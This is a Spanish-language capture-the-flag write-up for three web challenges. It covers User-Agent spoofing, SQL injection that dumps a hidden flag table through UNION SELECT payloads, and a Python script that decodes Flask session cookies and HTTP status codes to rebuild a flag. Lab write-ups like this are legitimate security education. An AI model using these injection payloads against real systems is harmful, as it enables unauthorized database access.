#### Web1 (75pts)

##### Descripción:

Identify yourself!!

`http://ctf.alphasec.xyz:9090/` 

##### Solución:

Cuando accedemos a la web, nos encontramos con lo siguiente:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/Vivaldi.png" width=350>

Cuyo código fuente es:

`<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bd/Vivaldi.jpg/220px-Vivaldi.jpg" >`

La página web no tenía nada más, y la solución para resolver este reto era entender la referencia de la imagen, ya que existe un navegador con el nombre de Vivaldi. Por lo que se buscó el `User-Agent` de dicho navegador:

Enlace: [https://developers.whatismybrowser.com/useragents/explore/software_name/vivaldi/](https://developers.whatismybrowser.com/useragents/explore/software_name/vivaldi/)

Cambiando el `User-Agent` a:


`Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1147.64`

Conseguimos la flag:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/Vivaldi2.png" width=350>

**Flag:** flag{LasCuatroEstaciones}


#### Web2 Red Flag (250pts)

##### Descripción:

¡Por fin un reto de capturar la bandera! Recuerda, sólo hay una bandera buena

`http://ctf.alphasec.xyz:9091/`

¡¡¡Solo tienes dos intentos miralo bien!!!

##### Solución:

Cuando accedemos a la página, observamos una imagen, en la que la bandera cambia al color que nosotros le indiquemos a través de unos botones:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/redflag2.png" width=350>


Viendo el código fuente, nos damos cuenta que estos colores se asignan realizando peticiones GET:

```html
<!doctype html>
<title>Reto</title>
<!-- <link rel=stylesheet type=text/css href="/static/style.css"> -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div class=page>
  <h1>Bandiera Rossa</h1>

  <div id="bandera" style="width: 90%;">
    <img src="static/flag.png" style="width: 100%;display: block;">
  </div>
  <div>
    <button id="red">Red</button>
    <button id="green">Green</button>
    <button id="blue">Blue</button>
    <button id="black">Black</button>
    <button id="white">White</button>
  </div>

  <script>
    $(document).ready(function(){
      $('button').click(function(x){
        $.get("/get?name=" + this.id, function(data){

          var color = data.colors[0][0];
          $('#bandera').css('background', '#' + color);
        });
      });
    })
  </script>
</div>
```

La petición en cuestión es:

`http://ctf.alphasec.xyz:9091/get?name=<color>`

Lo primero que a uno se le viene a la cabeza es probar SQLi, así que procedemos a comprobar si es vulnerable:

`http://ctf.alphasec.xyz:9091/get?name=blue' and 1=1--`

Y obtenemos el siguiente resultado:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/redflag4.png" width=350>

Podemos observar como si es vulnerable. Probando lo siguiente:

`http://ctf.alphasec.xyz:9091/get?name=blue' or 1=1--`

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/redflag5.png" width=350>

Y obtenemos la representación RGB en hex de varios colores, pero uno de los valores no cuadra demasiado (`red`), y dado que lo que manejamos son colores y banderas, y los parámetros GET están en inglés, se probó con un poco de sentido común:

`http://ctf.alphasec.xyz:9091/get?name=blue' union select name from colors--`

Y obtenemos lo siguiente:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/redflag6.png" width=350>

Como observamos aquí, `flag` no pinta para nada, por lo que nos da una pista de como seguir, así que probamos lo siguiente:

`http://ctf.alphasec.xyz:9091/get?name=blue' union select id from flag--`

Y obtenemos:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/redflag7.png" width=350>

Y realizando la siguiente SQLi, podremos obtener una lista de flags:

`http://ctf.alphasec.xyz:9091/get?name=blue' union select value from flag--`

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/redflag8.png" width=350>

¿Cómo podemos saber cual es la flag? La pista se encuentra en la SQLi anterior, en la que el valor `id=8` no cuadraba. Por lo que la flag era: `flag{un_bolero_en_berlin}`

**Flag:** flag{un_bolero_en_berlin}

#### Codificado (250pts)

##### Descripción: 

Una auténtica obra de arte diseñada para tender puentes entre la esteganografía y los protocolos web. Conoces estos últimos, ¿No? 200 todo bien, 30x a ver qué me espera, 50x hay algo mal en el server, 40x hay algo mal en tí... ¡¿602?!

El reto está el puerto 9093

> Hint! 602 o 608, pero nunca 200 o 404... Aquí la clave la marca la diferencia... ;)

##### Solución: 

Cuando accedemos a la página web podemos ver lo siguiente:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/Codificado1.png" width=350>

Y su código HTML es el siguiente:

```html
<!doctype html>
<title>Reto</title>
<!-- <link rel=stylesheet type=text/css href="/static/style.css"> -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div class=page>
  <h1>Codigo web</h1>
  <h2>200 - OK</h2>
  <a href="/?input=46">Test another</a>
</div>
```
Y la respuesta es:

```
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 300
Vary: Cookie
Set-Cookie: session=eyJpdGVyYSI6MX0.XEedyQ.VSsiMZhjtxy-wHke4hw66e6aInM; HttpOnly; Path=/
Server: Werkzeug/0.14.1 Python/3.5.3
Date: Tue, 22 Jan 2019 22:48:41 GMT
```

Si analizamos la cookie, nos fijamos que es un base64 que se encuentra dividido en 3 secciones. Diseccionandola, nos damos cuenta de que el primer fragmento:

|  Base64 | Valor  |
|---|---|
| eyJpdGVyYSI6MX0 | {"itera":1}  |

Esto nos está dando una pista de que número deberíamos usar en el parametro GET, `input`. Si seguimos las indicaciones, veremos que iteraremos de manera secuencial hasta llegar al número 100, dónde posteriormente nos saldrá un error.

Este reto web, tenía una parte de esteganografía, ya que en función del número que se le pusiera, el `HTTP CODE` que se recibía y el que aparece en el HTML, son totalmente diferentes. 

Buscando patrones en las respuestas, se detectó un rango de números de manera secuencias, recibía en la respuesta HTML el código 500, que restando este valor al `HTTP CODE` de la respuesta da como resultado a un caracter en formato decimal. Por ejemplo:

|  HTTP CODE | HTML CODE  | Diferencia  | ASCII  |
|---|---|---|---|
| 602  | 500  | 102  | f |

El que empiece por `f` nos da buenas señales, ya que las flags comienzan por `flag{`. Siguiendo esta misma lógica, se creó el siguiente script:

```python
import os
import re
import json
import base64
import requests

url = "http://ctf.alphasec.xyz:9093/"
flag = ""

s = requests.Session()
input = None

while True:
    if input == 100:
        break
    try:
        if input == None:
            r = s.get(url)
        else:
            payload = {'input': input}
            r = s.get(url, params=payload)
    except:
        continue

    cookie = r.headers['Set-Cookie']
    match = re.search(r"session=([a-zA-Z0-9]+)", cookie)
    iteration = base64.b64decode(match.group(1)+"===").decode('utf-8')

    input = json.loads(iteration)['itera']

    #print("Iteration: {}".format(input))
    #print("Code: {}".format(r.status_code))

    if "500" in r.text:
        match = re.search(r"\<h2\>(\d+)\s-", r.text)
        code = match.group(1)
        char = chr(r.status_code - int(code))
        flag += char
        print("[*] Char found: {}".format(char))

flag = re.search(r"(flag{\w+})", flag)
print("\n[!] The flag is: {}".format(flag.group(1)))
```

Y obtenemos como resultado:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/master/2019/UAH/Web/Images/Codificado2.png" width=350>


**Flag:** flag{encodigoweb}
